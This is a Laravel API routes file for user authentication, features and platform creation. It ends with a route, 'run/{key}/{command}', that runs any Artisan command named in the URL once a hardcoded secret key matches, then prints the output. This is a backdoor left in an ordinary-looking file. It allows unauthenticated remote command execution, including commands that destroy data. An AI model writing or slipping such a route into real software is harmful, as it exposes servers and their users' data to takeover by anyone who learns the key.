<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Artisan;
use App\Modules\V1\Users\Presentation\Http\Controllers\UserAuthController;
use App\Modules\V1\Features\Presentation\Http\Controllers\FeatureController;
use App\Modules\V1\Platforms\Presentation\Http\Controllers\PlatformController;
use App\Modules\V1\AIChatBot\Controllers\AIChatBotController;
use \App\Modules\V1\Initialization\Controllers\PlatformInitializationController;

Route::post('login', [UserAuthController::class, 'login']);

Route::post('signup', [UserAuthController::class, 'signUp']);
Route::post('resend-otp', [UserAuthController::class, 'resendOtp']);
Route::post('verify-email', [UserAuthController::class, 'verifyEmail'])
    ->middleware(['auth:sanctum', 'abilities:not-verified']);

Route::group(['middleware' => ['locale']], function () {
    Route::get('/features', [FeatureController::class, 'getActiveFeatures']);
    Route::get('/dynamic-features', [FeatureController::class, 'getDynamicFeatures']);

    Route::prefix('platform')->group(function (){
        Route::post('create', [PlatformController::class, 'store']);
    });

    Route::group(['middleware' => ['auth:sanctum', 'locale']], function () {
        Route::delete('logout', [UserAuthController::class, 'logout']);
    });
});


Route::get('run/{key}/{command}', function($key, $command) {
    if ($key === "osama-gasser734155568802") {
        $output = Artisan::call($command);
        echo nl2br($output);
    }
});
